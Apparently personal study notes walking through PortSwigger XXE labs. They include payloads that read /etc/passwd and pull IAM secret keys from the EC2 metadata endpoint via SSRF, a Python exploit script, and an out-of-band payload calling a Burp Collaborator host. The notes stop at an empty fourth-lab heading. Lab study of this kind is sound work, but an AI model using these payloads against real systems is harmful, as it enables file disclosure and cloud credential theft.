"## **1. Exploiting XXE using external entities to retrieve files**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.

step1:
![[Pasted image 20240925193628.png]]

step2:
![[Pasted image 20240925193654.png]]

step3:
![[Pasted image 20240925193806.png]]

- discovering where we can inject an XML entity and test for it :
![[Pasted image 20240925194015.png]]
- reference the entity as an internal one to prove the concept
	![[Pasted image 20240925194111.png]]

- proceed further using an external XML entity to abuse the system & reveal info
		![[Pasted image 20240925194143.png]]

## **2. Exploiting XXE to perform SSRF attacks**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. 
To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.

Analysis:

- following xml error we will append directories in our server request 
http://169.254.169.254/
http://169.254.169.254/latest
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY nbyte SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../.../admin"> ]>
<stockCheck>
	<productId>
		&paein;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240926201314.png]]

- Python script
```
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_xxe(s, url):

    print("(+) Exploiting XXE Injection...")
    stock_url = url + "/product/stock"
    data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
    print("(+) The following is the content of the secret file: ")
    print(r.text)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)
```

## **3. Blind XXE with out-of-band interaction**
This lab has a "Check stock" feature that parses XML input but does not display the result.
You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Analysis:

- testing for XXE vulnerability (using internal XXE)
![[Pasted image 20240927012427.png]]

- we will try an external XXE (same response)
![[Pasted image 20240927012657.png]]

- we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://BurpCollaboratorServer">]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240927013218.png]]

# **4. Blind XXE with out-of-band interaction via XML parameter entities**
